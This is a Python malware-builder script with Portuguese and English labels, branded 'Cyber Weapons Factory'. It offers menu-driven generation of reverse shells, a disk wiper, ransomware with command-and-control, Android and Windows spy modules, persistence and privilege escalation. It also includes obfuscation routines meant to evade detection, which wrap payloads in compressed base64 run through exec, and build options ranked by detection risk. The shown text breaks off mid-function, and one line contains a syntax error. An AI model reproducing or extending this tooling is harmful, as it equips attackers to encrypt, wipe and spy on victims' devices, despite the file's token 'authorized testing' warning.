#!/data/data/com.termux/files/usr/bin/python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import random
import base64
import zlib
import platform
import hashlib
import json
import uuid
import ctypes
import threading
from typing import Dict, List, Optional, Union
from datetime import datetime

# Criptografia avançada
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Util.Padding import pad, unpad
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

# Interface avançada
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.prompt import Prompt, Confirm, IntPrompt
from rich.progress import Progress, BarColumn, TimeRemainingColumn
from rich.text import Text
from rich.syntax import Syntax
from rich.tree import Tree
from rich.markdown import Markdown

# Realce de código
import pygments
from pygments.lexers import PythonLexer, BashLexer, PowerShellLexer
from pygments.formatters import TerminalFormatter

# Persistência
import winreg  # Windows only
import getpass

console = Console()

class AdvancedPayloadGenerator:
    def __init__(self):
        self.payloads = {
            'reverse_tcp': {
                'function': self.generate_reverse_tcp,
                'category': 'Shells',
                'danger_level': 'medium',
                'description': 'Reverse Shell TCP com técnicas de evasão'
            },
            'bind_tcp': {
                'function': self.generate_bind_tcp,
                'category': 'Shells',
                'danger_level': 'medium',
                'description': 'Bind Shell TCP com criptografia'
            },
            'disk_wiper': {
                'function': self.generate_disk_wiper,
                'category': 'Destrutivos',
                'danger_level': 'critical',
                'description': 'Wiper avançado com múltiplos passes'
            },
            'advanced_ransomware': {
                'function': self.generate_advanced_ransomware,
                'category': 'Destrutivos',
                'danger_level': 'critical',
                'description': 'Ransomware com C2 e chave assimétrica'
            },
            'android_spy': {
                'function': self.generate_android_spy_module,
                'category': 'Mobile',
                'danger_level': 'high',
                'description': 'Módulo de espionagem Android completo'
            },
            'windows_spy': {
                'function': self.generate_windows_spy_module,
                'category': 'Espionagem',
                'danger_level': 'high',
                'description': 'Coleta completa de dados do Windows'
            },
            'browser_exploit': {
                'function': self.generate_browser_exploit,
                'category': 'Exploits',
                'danger_level': 'high',
                'description': 'Exploit para navegadores com C2'
            },
            'persistence': {
                'function': self.generate_persistence_module,
                'category': 'Persistence',
                'danger_level': 'medium',
                'description': 'Módulo de persistência multiplataforma'
            },
            'network_scanner': {
                'function': self.generate_network_scanner,
                'category': 'Recon',
                'danger_level': 'low',
                'description': 'Scanner de rede com detecção de hosts'
            },
            'privilege_escalation': {
                'function': self.generate_priv_escalation,
                'category': 'Exploits',
                'danger_level': 'high',
                'description': 'Tentativas de escalação de privilégio'
            }
        }
        
        self.obfuscation_techniques = {
            'polymorphic': 'Ofuscação polimórfica avançada',
            'metamorphic': 'Ofuscação metamórfica',
            'aes_encrypt': 'Criptografia AES-256 com KDF',
            'rsa_encrypt': 'Criptografia RSA assimétrica',
            'code_splitting': 'Fragmentação de código',
            'anti_analysis': 'Técnicas anti-análise',
            'junk_code': 'Inserção de código lixo',
            'env_key': 'Chave derivada de ambiente'
        }
        
        self.c2_settings = {
            'server': "https://your-c2-domain.com/api/v1",
            'auth_key': "your-api-key-here",
            'interval': 5,
            'jitter': 2
        }
        
        self.compilers = {
            'pyinstaller': 'Compilar para EXE (Windows)',
            'termux': 'Compilar para Termux (Android)',
            'cython': 'Otimizar com Cython',
            'nuitka': 'Compilar com Nuitka'
        }
        
        self.banners = [
            self._generate_apocalyptic_banner(),
            self._generate_tech_banner(),
            self._generate_blood_banner(),
            self._generate_cyber_banner()
        ]
        
        self._check_dependencies()
        self.session_id = str(uuid.uuid4())
        self._log_activity("Tool initialized")
    
    def _generate_apocalyptic_banner(self) -> str:
        return """
[bold red]
 ██████╗ ███████╗██████╗ ███████╗██████╗  ██████╗ ██╗     ███████╗
██╔═══██╗██╔════╝██╔══██╗██╔════╝██╔══██╗██╔═══██╗██║     ██╔════╝
██║   ██║█████╗  ██████╔╝█████╗  ██████╔╝██║   ██║██║     █████╗  
██║   ██║██╔══╝  ██╔══██╗██╔══╝  ██╔══██╗██║   ██║██║     ██╔══╝  
╚██████╔╝██║     ██║  ██║███████╗██║  ██║╚██████╔╝███████╗███████╗
 ╚═════╝ ╚═╝     ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝
[/bold red]
[bold white on red] ADVANCED PAYLOAD GENERATOR v7.0 - APOCALYPTIC EDITION [/bold white on red]
[red]Warning: This tool is for authorized testing only![/red]
"""
    
    def _generate_tech_banner(self) -> str:
        return """
[bold blue]
  _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ 
 |_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|
 |                                                                 |
 |    ███████╗██████╗ ██╗   ██╗███████╗██████╗ ███████╗██████╗     |
 |    ██╔════╝██╔══██╗██║   ██║██╔════╝██╔══██╗██╔════╝██╔══██╗    |
 |    █████╗  ██████╔╝██║   ██║█████╗  ██████╔╝█████╗  ██████╔╝    |
 |    ██╔══╝  ██╔══██╗╚██╗ ██╔╝██╔══╝  ██╔══██╗██╔══╝  ██╔══██╗    |
 |    ██║     ██║  ██║ ╚████╔╝ ███████╗██║  ██║███████╗██║  ██║    |
 |    ╚═╝     ╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝    |
 |                                                                 |
 |_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|
[/bold blue]
[bold white on blue] CYBER SECURITY TOOLKIT - PAYLOAD GENERATOR [/bold white on blue]
"""
    
    def _generate_blood_banner(self) -> str:
        return """
[bold red]
                      .                                                      .
                    .n                   .                 .                  n.
              .   .dP                  dP                   9b                 9b.    .
             4    qXb         .       dX                     Xb       .        dXp     t
            dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
           9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
           9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
            `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
              `9XXXXXXXXXXXP' `9XX'          `98v8P'          `XXP' `9XXXXXXXXXXXP'
                  ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
                                )b.  .dbo.dP'`v'`9b.odb.  .dX(
                              ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
                             dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
                            dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                            9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
                             `'      9XXXXXX(   )XXXXXXP      `'
                                      XXXX X.`v'.X XXXX
                                      XP^X'`b   d'`X^XX
                                      X. 9  `   '  P )X
                                      `b  `       '  d'
                                       `             '
[/bold red]
[bold white on red] ELITE PAYLOAD GENERATOR - BLOOD EDITION [/bold white on red]
"""
    
    def _generate_cyber_banner(self) -> str:
        return """
[bold cyan]
        .o oOOOOOOOo                                            OOOo
        Ob.OOOOOOOo  OOOo.      oOOo.                      .adOOOOOOO
        OboO"""""""""""".OOo. .oOOOOOo.    OOOo.oOOOOOo.."""""""""'OO
        OOP.oOOOOOOOOOOO "POOOOOOOOOOOo.   `"OOOOOOOOOP,OOOOOOOOOOOB'
        `O'OOOO'     `OOOOo"OOOOOOOOOOO` .adOOOOOOOOO"oOOO'    `OOOOo
        .OOOO'            `OOOOOOOOOOOOOOOOOOOOOOOOOO'            `OO
        OOOOO                 '"OOOOOOOOOOOOOOOO"`                oOO
       oOOOOOba.                .adOOOOOOOOOOba               .adOOOOo.
      oOOOOOOOOOOOOOba.    .adOOOOOOOOOO@^OOOOOOOba.     .adOOOOOOOOOOOO
     OOOOOOOOOOOOOOOOO.OOOOOOOOOOOOOO"`  '"OOOOOOOOOOOOO.OOOOOOOOOOOOOO
     "OOOO"       "YOoOOOOMOIONODOO"`  .   '"OOROAOPOEOOOoOY"     "OOO"
        Y           'OOOOOOOOOOOOOO: .oOOo. :OOOOOOOOOOO?'         :`
        :            .oO%OOOOOOOOOOo.OOOOOO.oOOOOOOOOOOOO?         .
        .            oOOP"%OOOOOOOOoOOOOOOO?oOOOOO?OOOO"OOo
                     '%o  OOOO"%OOOO%"%OOOOO"OOOOOO"OOO':
                          `$"  `OOOO' `O"Y ' `OOOO'  o             .
        .                  .     OP"          : o     .
                                 :
                                  .
[/bold cyan]
[bold black on cyan] CYBER WEAPONS FACTORY - PAYLOAD GENERATOR [/bold black on cyan]
"""
    
    def _check_dependencies(self):
        required = {
            'cryptography': 'cryptography',
            'pycryptodome': 'pycryptodomex',
            'rich': 'rich',
            'pygments': 'pygments',
            'requests': 'requests'
        }
        
        missing = []
        for pkg, install_name in required.items():
            try:
                __import__(pkg)
            except ImportError:
                missing.append(install_name)
        
        if missing:
            console.print(Panel.fit(
                f"[red]✗ Missing dependencies: {', '.join(missing)}[/red]",
                title="[bold red]ERROR[/bold red]",
                border_style="red"
            ))
            if Confirm.ask("Install automatically?"):
                with Progress() as progress:
                    task = progress.add_task("[red]Installing...[/red]", total=len(missing))
                    for pkg in missing:
                        os.system(f"pip install {pkg} --quiet")
                        progress.update(task, advance=1)
                console.print("[green]✓ Dependencies installed![/green]")
                time.sleep(1)
    
    def _log_activity(self, action: str):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] [{self.session_id}] {action}"
        
        try:
            with open("payload_gen.log", "a") as f:
                f.write(log_entry + "\n")
        except:
            pass
    
    def show_banner(self):
        console.print(random.choice(self.banners))
        console.print(Panel.fit(
            "[blink bold red]⚠️ WARNING: UNAUTHORIZED USE IS ILLEGAL! ⚠️[/blink bold red]",
            style="red on black"
        ))
        time.sleep(1)
    
    def show_main_menu(self):
        while True:
            console.clear()
            self.show_banner()
            
            categories = {
                'Shells': "Advanced Shells",
                'Destrutivos': "Destructive Payloads",
                'Mobile': "Mobile Modules",
                'Espionagem': "Espionage Tools",
                'Exploits': "Exploits",
                'Persistence': "Persistence Modules",
                'Recon': "Reconnaissance"
            }
            
            table = Table(
                title="[bold cyan]🔧 MAIN MENU[/bold cyan]",
                show_header=True,
                header_style="bold magenta"
            )
            table.add_column("Option", style="cyan", width=10)
            table.add_column("Category", style="green")
            table.add_column("Danger", style="red")
            
            for i, (code, name) in enumerate(categories.items(), 1):
                danger = "☠️ CRITICAL" if code == 'Destrutivos' else \
                         "⚠️ HIGH" if code in ['Exploits', 'Espionagem'] else \
                         "◎ MEDIUM"
                table.add_row(str(i), name, danger)
            
            table.add_row("C", "C2 Settings", "⚙️")
            table.add_row("O", "Obfuscation", "🌀")
            table.add_row("B", "Build Options", "🛠️")
            table.add_row("X", "Exit", "🚪")
            
            console.print(table)
            
            choice = Prompt.ask(
                "[blink yellow]➤[/blink yellow] Select",
                choices=[str(i) for i in range(1, len(categories)+1] + ['C', 'O', 'B', 'X'],
                show_choices=False
            )
            
            if choice == "1":
                self._show_submenu('Shells')
            elif choice == "2":
                self._show_submenu('Destrutivos')
            elif choice == "3":
                self._show_submenu('Mobile')
            elif choice == "4":
                self._show_submenu('Espionagem')
            elif choice == "5":
                self._show_submenu('Exploits')
            elif choice == "6":
                self._show_submenu('Persistence')
            elif choice == "7":
                self._show_submenu('Recon')
            elif choice == "C":
                self._show_c2_settings()
            elif choice == "O":
                self._show_obfuscation_menu()
            elif choice == "B":
                self._show_build_menu()
            elif choice == "X":
                self._exit_tool()
    
    def _show_submenu(self, category: str):
        payloads_category = {k: v for k, v in self.payloads.items() if v['category'] == category}
        
        while True:
            console.clear()
            title = f"[bold]{category.upper()}[/bold] - Select Payload"
            
            if category == 'Destrutivos':
                title = f"[blink bold red]☠️ {category.upper()} ☠️[/blink bold red]"
            
            table = Table(
                title=title,
                show_header=True,
                header_style="bold blue"
            )
            table.add_column("ID", style="cyan", width=5)
            table.add_column("Name", style="green")
            table.add_column("Description")
            table.add_column("Danger", style="red")
            
            for i, (name, data) in enumerate(payloads_category.items(), 1):
                danger_icon = {
                    'medium': '⚠️',
                    'high': '🔥',
                    'critical': '💀'
                }.get(data['danger_level'], '')
                table.add_row(
                    str(i),
                    name,
                    data['description'],
                    f"{danger_icon} {data['danger_level'].upper()}"
                )
            
            table.add_row("0", "Back", "Return to main menu", "↩️")
            console.print(table)
            
            choice = Prompt.ask(
                "[blink yellow]➤[/blink yellow] Select",
                choices=[str(i) for i in range(0, len(payloads_category)+1)],
                show_choices=False
            )
            
            if choice == "0":
                return
            
            payload_name = list(payloads_category.keys())[int(choice)-1]
            self._process_payload(payload_name)
    
    def _process_payload(self, payload_name: str):
        payload_data = self.payloads[payload_name]
        self._log_activity(f"Selected payload: {payload_name}")
        
        if payload_data['danger_level'] in ['high', 'critical']:
            console.print(Panel.fit(
                "[blink bold red]⚠️ HIGH DANGER PAYLOAD ⚠️[/blink bold red]\n"
                "This payload can cause permanent damage!\n"
                "Use only in controlled environments!",
                border_style="red"
            ))
            
            if not Confirm.ask("Confirm creation?", default=False):
                self._log_activity("Payload creation cancelled")
                return
        
        config = self._configure_payload(payload_name)
        if config is None:
            self._log_activity("Payload configuration cancelled")
            return
        
        obfuscate = Confirm.ask("Apply obfuscation techniques?")
        techniques = []
        if obfuscate:
            techniques = self._select_obfuscation_techniques()
        
        build = Confirm.ask("Compile to executable?")
        build_method = None
        if build:
            build_method = self._select_build_method()
        
        with Progress(
            "[progress.description]{task.description}",
            BarColumn(),
            "[progress.percentage]{task.percentage:>3.0f}%",
            TimeRemainingColumn()
        ) as progress:
            task = progress.add_task("[red]Generating...[/red]", total=100)
            
            payload = payload_data['function'](**config)
            progress.update(task, advance=20)
            
            if obfuscate:
                for technique in techniques:
                    payload = self._advanced_obfuscate(payload, technique)
                    progress.update(task, advance=15)
            
            if build and build_method:
                payload = self._compile_payload(payload, build_method)
                progress.update(task, advance=20)
            
            progress.update(task, completed=100)
        
        self._preview_payload(payload, 'python')
        self._save_payload(payload_name, payload)
    
    def _configure_payload(self, payload_name: str) -> Optional[Dict]:
        config = {}
        
        if payload_name in ['reverse_tcp', 'bind_tcp']:
            console.print(Panel.fit(
                "[bold]Payload Configuration[/bold]",
                border_style="blue"
            ))
            config['ip'] = Prompt.ask("[yellow]?[/yellow] IP", default="192.168.1.100")
            config['port'] = IntPrompt.ask("[yellow]?[/yellow] Port", default=4444)
            config['encryption'] = Confirm.ask("[yellow]?[/yellow] Enable encryption?", default=True)
            if config['encryption']:
                config['encryption_key'] = Prompt.ask(
                    "[yellow]?[/yellow] Encryption key (leave blank for random)",
                    default=""
                ) or Fernet.generate_key().decode()
        
        elif payload_name == 'disk_wiper':
            console.print(Panel.fit(
                "[bold red]WARNING: DESTRUCTIVE PAYLOAD[/bold red]",
                border_style="red"
            ))
            config['passes'] = IntPrompt.ask(
                "[yellow]?[/yellow] Number of overwrite passes",
                default=3
            )
            config['target_dirs'] = Prompt.ask(
                "[yellow]?[/yellow] Target directories (comma separated)",
                default="/home,/var,/etc"
            ).split(',')
        
        elif payload_name == 'advanced_ransomware':
            console.print(Panel.fit(
                "[bold red]RANSOMWARE CONFIGURATION[/bold red]",
                border_style="red"
            ))
            config['extensions'] = Prompt.ask(
                "[yellow]?[/yellow] File extensions to encrypt",
                default=".doc,.docx,.xls,.xlsx,.pdf,.jpg,.png,.txt,.db"
            ).split(',')
            config['ransom_note'] = Prompt.ask(
                "[yellow]?[/yellow] Ransom note text",
                default="Your files have been encrypted!"
            )
            config['c2_enabled'] = Confirm.ask(
                "[yellow]?[/yellow] Enable C2 communication?",
                default=True
            )
            if config['c2_enabled']:
                config['c2_server'] = Prompt.ask(
                    "[yellow]?[/yellow] C2 server URL",
                    default=self.c2_settings['server']
                )
                config['c2_interval'] = IntPrompt.ask(
                    "[yellow]?[/yellow] Check-in interval (minutes)",
                    default=5
                )
        
        elif payload_name in ['android_spy', 'windows_spy', 'browser_exploit']:
            config['c2_server'] = Prompt.ask(
                "[yellow]?[/yellow] C2 server URL",
                default=self.c2_settings['server']
            )
            config['interval'] = IntPrompt.ask(
                "[yellow]?[/yellow] Check-in interval (minutes)",
                default=5
            )
            config['jitter'] = IntPrompt.ask(
                "[yellow]?[/yellow] Jitter percentage (0-100)",
                default=20
            )
            config['persistence'] = Confirm.ask(
                "[yellow]?[/yellow] Enable persistence?",
                default=True
            )
        
        console.print("\n[bold]Configuration Summary:[/bold]")
        for key, value in config.items():
            console.print(f"  [cyan]{key}:[/cyan] {value}")
        
        if not Confirm.ask("\nConfirm configuration?"):
            return None
        
        return config
    
    def _select_obfuscation_techniques(self) -> List[str]:
        console.print("\n[bold]Obfuscation Techniques:[/bold]")
        table = Table(show_header=True, header_style="bold magenta")
        table.add_column("ID", style="cyan", width=5)
        table.add_column("Technique", style="green")
        table.add_column("Level", style="yellow")
        
        techniques = [
            ("1", "Polymorphic", "High"),
            ("2", "Metamorphic", "Very High"),
            ("3", "AES Encryption", "Medium"),
            ("4", "RSA Encryption", "High"),
            ("5", "Code Splitting", "Low"),
            ("6", "Anti-Analysis", "Medium"),
            ("7", "Junk Code", "Low"),
            ("8", "Environment Key", "High")
        ]
        
        for tech in techniques:
            table.add_row(*tech)
        
        console.print(table)
        
        choices = Prompt.ask(
            "[yellow]?[/yellow] Select techniques (comma separated)",
            default="1,3,6"
        )
        
        selected = []
        for choice in choices.split(','):
            try:
                idx = int(choice.strip()) - 1
                selected.append(list(self.obfuscation_techniques.keys())[idx])
            except:
                continue
        
        self._log_activity(f"Selected obfuscation: {', '.join(selected)}")
        return selected
    
    def _select_build_method(self) -> Optional[str]:
        console.print("\n[bold]Build Methods:[/bold]")
        table = Table(show_header=True, header_style="bold magenta")
        table.add_column("ID", style="cyan", width=5)
        table.add_column("Method", style="green")
        table.add_column("Platform", style="yellow")
        
        for i, (code, desc) in enumerate(self.compilers.items(), 1):
            platform = "Windows" if code == 'pyinstaller' else \
                      "Android" if code == 'termux' else \
                      "Cross-platform"
            table.add_row(str(i), desc, platform)
        
        console.print(table)
        
        choice = Prompt.ask(
            "[yellow]?[/yellow] Select build method",
            choices=[str(i) for i in range(1, len(self.compilers)+1)],
            show_choices=False
        )
        
        if choice:
            method = list(self.compilers.keys())[int(choice)-1]
            self._log_activity(f"Selected build method: {method}")
            return method
        return None
    
    def _preview_payload(self, payload: str, language: str = 'python'):
        console.print(Panel.fit(
            "[bold]PAYLOAD PREVIEW[/bold]",
            border_style="yellow"
        ))
        
        lexer = {
            'python': PythonLexer(),
            'powershell': PowerShellLexer(),
            'bash': BashLexer()
        }.get(language, PythonLexer())
        
        formatter = TerminalFormatter()
        
        lines = payload.split('\n')[:30]  # Show first 30 lines
        code = '\n'.join(lines)
        
        highlighted = pygments.highlight(code, lexer, formatter)
        console.print(highlighted)
        
        if len(payload.split('\n')) > 30:
            console.print("[yellow]... (truncated preview)[/yellow]")
    
    def _save_payload(self, payload_name: str, payload: str):
        default_name = f"payload_{payload_name}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        if payload_name == 'advanced_ransomware':
            default_name += "_ransomware"
        elif payload_name in ['reverse_tcp', 'bind_tcp']:
            default_name += "_shell"
        
        default_name += ".py" if not payload.endswith(".exe") else ".exe"
        
        filename = Prompt.ask(
            "[yellow]?[/yellow] Output filename",
            default=default_name
        )
        
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(payload)
            
            # Calculate hashes
            with open(filename, 'rb') as f:
                file_data = f.read()
                md5 = hashlib.md5(file_data).hexdigest()
                sha1 = hashlib.sha1(file_data).hexdigest()
                sha256 = hashlib.sha256(file_data).hexdigest()
            
            # Show success panel
            success_panel = Panel.fit(
                f"[green]✓ Saved as [bold]{filename}[/bold][/green]\n"
                f"[cyan]Size: [bold]{len(file_data)/1024:.2f} KB[/bold][/cyan]\n"
                f"[cyan]MD5: [bold]{md5}[/bold][/cyan]\n"
                f"[cyan]SHA1: [bold]{sha1}[/bold][/cyan]\n"
                f"[cyan]SHA256: [bold]{sha256}[/bold][/cyan]",
                title="[bold green]SUCCESS[/bold green]",
                border_style="green"
            )
            console.print(success_panel)
            
            self._log_activity(f"Payload saved: {filename}")
            
        except Exception as e:
            error_panel = Panel.fit(
                f"[red]✗ Error: {str(e)}[/red]",
                title="[bold red]ERROR[/bold red]",
                border_style="red"
            )
            console.print(error_panel)
            self._log_activity(f"Save failed: {str(e)}")
        
        input("\nPress Enter to continue...")
    
    def _show_c2_settings(self):
        while True:
            console.clear()
            console.print(Panel.fit(
                "[bold cyan]⚙️ C2 SERVER SETTINGS[/bold cyan]",
                border_style="cyan"
            ))
            
            table = Table.grid()
            table.add_column("Setting", style="cyan")
            table.add_column("Value", style="green")
            
            table.add_row("Server URL", self.c2_settings['server'])
            table.add_row("API Key", self.c2_settings['auth_key'][:4] + "****" + self.c2_settings['auth_key'][-4:])
            table.add_row("Default Interval", f"{self.c2_settings['interval']} minutes")
            table.add_row("Jitter", f"{self.c2_settings['jitter']}%")
            
            console.print(table)
            
            table = Table.grid()
            table.add_row("1", "Change Server URL")
            table.add_row("2", "Change API Key")
            table.add_row("3", "Test Connection")
            table.add_row("0", "Back")
            console.print(table)
            
            choice = Prompt.ask(
                "[blink yellow]➤[/blink yellow] Select",
                choices=["0", "1", "2", "3"],
                show_choices=False
            )
            
            if choice == "1":
                self.c2_settings['server'] = Prompt.ask(
                    "[yellow]?[/yellow] New C2 server URL",
                    default=self.c2_settings['server']
                )
            elif choice == "2":
                self.c2_settings['auth_key'] = Prompt.ask(
                    "[yellow]?[/yellow] New API key",
                    default=self.c2_settings['auth_key']
                )
            elif choice == "3":
                self._test_c2_connection()
            elif choice == "0":
                return
    
    def _test_c2_connection(self):
        try:
            import requests
            with console.status("[bold green]Testing connection...") as status:
                response = requests.post(
                    f"{self.c2_settings['server']}/ping",
                    headers={"Authorization": f"Bearer {self.c2_settings['auth_key']}"},
                    timeout=10
                )
                
                if response.status_code == 200:
                    console.print("[green]✓ Connection successful![/green]")
                else:
                    console.print(f"[yellow]⚠️ Server responded with: {response.status_code}[/yellow]")
        except Exception as e:
            console.print(f"[red]✗ Connection failed: {str(e)}[/red]")
        
        input("\nPress Enter to continue...")
    
    def _show_obfuscation_menu(self):
        while True:
            console.clear()
            console.print(Panel.fit(
                "[bold cyan]🌀 OBFUSCATION TECHNIQUES[/bold cyan]",
                border_style="cyan"
            ))
            
            test_code = "print('Hello World')"
            
            table = Table(
                title="Available Techniques",
                show_header=True,
                header_style="bold magenta"
            )
            table.add_column("ID", style="cyan")
            table.add_column("Technique")
            table.add_column("Level")
            
            for i, (code, desc) in enumerate(self.obfuscation_techniques.items(), 1):
                level = {
                    'polymorphic': "High",
                    'metamorphic': "Very High",
                    'aes_encrypt': "Medium",
                    'rsa_encrypt': "High",
                    'code_splitting': "Low",
                    'anti_analysis': "Medium",
                    'junk_code': "Low",
                    'env_key': "High"
                }.get(code, "Medium")
                
                table.add_row(str(i), desc, level)
            
            console.print(table)
            
            table = Table.grid()
            table.add_row("1-8", "Test technique")
            table.add_row("C", "Combine techniques")
            table.add_row("0", "Back")
            console.print(table)
            
            choice = Prompt.ask(
                "[blink yellow]➤[/blink yellow] Select",
                choices=[str(i) for i in range(1, 9)] + ["C", "0"],
                show_choices=False
            )
            
            if choice == "0":
                return
            elif choice == "C":
                self._test_combined_obfuscation(test_code)
            elif choice.isdigit() and 1 <= int(choice) <= 8:
                technique = list(self.obfuscation_techniques.keys())[int(choice)-1]
                obfuscated = self._advanced_obfuscate(test_code, technique)
                
                console.print("\n[bold]Original:[/bold]")
                console.print(Syntax(test_code, "python"))
                
                console.print("\n[bold]Obfuscated:[/bold]")
                console.print(Syntax(obfuscated, "python"))
                
                input("\nPress Enter to continue...")
    
    def _test_combined_obfuscation(self, code: str):
        techniques = self._select_obfuscation_techniques()
        if not techniques:
            return
        
        obfuscated = code
        with Progress() as progress:
            task = progress.add_task("[red]Obfuscating...[/red]", total=len(techniques))
            
            for technique in techniques:
                obfuscated = self._advanced_obfuscate(obfuscated, technique)
                progress.update(task, advance=1)
        
        console.print("\n[bold]Final Obfuscated Code:[/bold]")
        console.print(Syntax(obfuscated, "python"))
        
        input("\nPress Enter to continue...")
    
    def _show_build_menu(self):
        while True:
            console.clear()
            console.print(Panel.fit(
                "[bold cyan]🛠️ BUILD OPTIONS[/bold cyan]",
                border_style="cyan"
            ))
            
            table = Table(
                title="Compilation Methods",
                show_header=True,
                header_style="bold magenta"
            )
            table.add_column("ID", style="cyan")
            table.add_column("Method")
            table.add_column("Platform")
            table.add_column("Description")
            
            for i, (code, desc) in enumerate(self.compilers.items(), 1):
                platform = "Windows" if code == 'pyinstaller' else \
                          "Android" if code == 'termux' else \
                          "Cross-platform"
                
                description = {
                    'pyinstaller': "Single EXE with all dependencies",
                    'termux': "Android executable (Termux)",
                    'cython': "Optimized Python extension",
                    'nuitka': "Compiled Python binary"
                }.get(code, "")
                
                table.add_row(str(i), desc, platform, description)
            
            console.print(table)
            
            table = Table.grid()
            table.add_row("1-4", "Select method")
            table.add_row("0", "Back")
            console.print(table)
            
            choice = Prompt.ask(
                "[blink yellow]➤[/blink yellow] Select",
                choices=[str(i) for i in range(0, 5)],
                show_choices=False
            )
            
            if choice == "0":
                return
            
            if choice.isdigit() and 1 <= int(choice) <= 4:
                method = list(self.compilers.keys())[int(choice)-1]
                self._explain_build_method(method)
    
    def _explain_build_method(self, method: str):
        console.clear()
        
        descriptions = {
            'pyinstaller': """
[bold]PyInstaller Method:[/bold]
Converts Python scripts into standalone executables.

[underline]Features:[/underline]
✓ Single EXE file output
✓ Cross-version compatibility
✓ Bundles all dependencies
✓ Works on Windows, Linux, macOS

[underline]Requirements:[/underline]
- PyInstaller installed (`pip install pyinstaller`)
- Windows for EXE output
- Adequate system resources

[underline]Detection Risk:[/underline]
Medium - Known tool patterns
            """,
            'termux': """
[bold]Termux Build Method:[/bold]
Creates Android-compatible executables for Termux.

[underline]Features:[/underline]
✓ Runs on Android without root
✓ Can be compiled to APK
✓ Access to Android APIs
✓ Works with Termux packages

[underline]Requirements:[/underline]
- Termux environment
- Python for Android
- NDK for compilation

[underline]Detection Risk:[/underline]
Low - Appears as normal Termux app
            """,
            'cython': """
[bold]Cython Optimization:[/bold]
Compiles Python to C for performance gains.

[underline]Features:[/underline]
✓ Improved execution speed
✓ Harder to reverse engineer
✓ Reduced memory footprint
✓ Cross-platform compatibility

[underline]Requirements:[/underline]
- Cython installed (`pip install cython`)
- C compiler toolchain
- Python development headers

[underline]Detection Risk:[/underline]
Medium - Still recognizable as Python
            """,
            'nuitka': """
[bold]Nuitka Compilation:[/bold]
Full Python compiler producing standalone binaries.

[underline]Features:[/underline]
✓ True compilation (not bytecode)
✓ Extreme performance
✓ Very hard to reverse
✓ Single binary output

[underline]Requirements:[/underline]
- Nuitka installed (`pip install nuitka`)
- C compiler toolchain
- Significant compilation time

[underline]Detection Risk:[/underline]
Low - Appears as native binary
            """
        }
        
        console.print(Panel.fit(
            Markdown(descriptions.get(method, "No information available")),
            title=f"[bold]{self.compilers[method]}[/bold]"
        ))
        
        if Confirm.ask("\nCreate test build?"):
            test_code = "print('Hello World')"
            self._compile_payload(test_code, method)
        
        input("\nPress Enter to continue...")
    
    def _advanced_obfuscate(self, payload: str, technique: str) -> str:
        if technique == 'polymorphic':
            return self._polymorphic_obfuscation(payload)
        elif technique == 'metamorphic':
            return self._metamorphic_obfuscation(payload)
        elif technique == 'aes_encrypt':
            return self._aes_encrypt_obfuscation(payload)
        elif technique == 'rsa_encrypt':
            return self._rsa_encrypt_obfuscation(payload)
        elif technique == 'code_splitting':
            return self._code_splitting_obfuscation(payload)
        elif technique == 'anti_analysis':
            return self._add_anti_analysis(payload)
        elif technique == 'junk_code':
            return self._add_junk_code(payload)
        elif technique == 'env_key':
            return self._env_key_obfuscation(payload)
        return payload
    
    def _polymorphic_obfuscation(self, payload: str) -> str:
        """Advanced polymorphic obfuscation with random mutations"""
        # Generate random variable names
        vars_random = [''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(6,12))) for _ in range(8)]
        
        # Create junk code blocks
        junk_blocks = [
            f"for {vars_random[0]} in range({random.randint(1,20)}): {vars_random[1]} = {random.randint(1000,9999)}",
            f"{vars_random[2]} = lambda {vars_random[3]}: {vars_random[3]}**{random.randint(2,5)}",
            f"class {vars_random[4].title()}:\n    def __init__(self):\n        self.{vars_random[5]} = {random.randint(0,1)}\n    def {vars_random[6]}(self):\n        return {random.randint(100,999)}"
        ]
        random.shuffle(junk_blocks)
        
        # Compress and encode payload
        compressed = zlib.compress(payload.encode())
        b64_encoded = base64.b64encode(compressed)
        
        # Generate random encryption key
        encryption_key = Fernet.generate_key().decode()
        
        return f"""# Polymorphic obfuscated payload - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
import base64,zlib,hashlib
from cryptography.fernet import Fernet

# Junk code blocks
{'\n'.join(junk_blocks)}

# Encryption setup
{vars_random[7]} = Fernet({encryption_key!r})
{vars_random[1]} = {b64_encoded!r}

# Payload execution
exec(zlib.decompress(base64.b64decode({vars_random[1]})))"""
    
    def _metamorphic_obfuscation(self, payload: str) -> str:
        """Metamorphic code that changes its structure each time"""
        # Parse the code and modify structure
        lines = payload.split('\n')
        new_lines = []
        
        # Randomly insert junk lines
        junk_lines = [
            f"# {hashlib.sha256(os.urandom(32)).hexdigest()}",
            f"''' Random docstring {random.randint(1000,9999)} '''",
            f"assert {random.randint(1,100)} > 0"
        ]
        
        for line in lines:
            if random.random() > 0.7:  # 30% chance to insert junk
                new_lines.append(random.choice(junk_lines))
            new_lines.append(line)
        
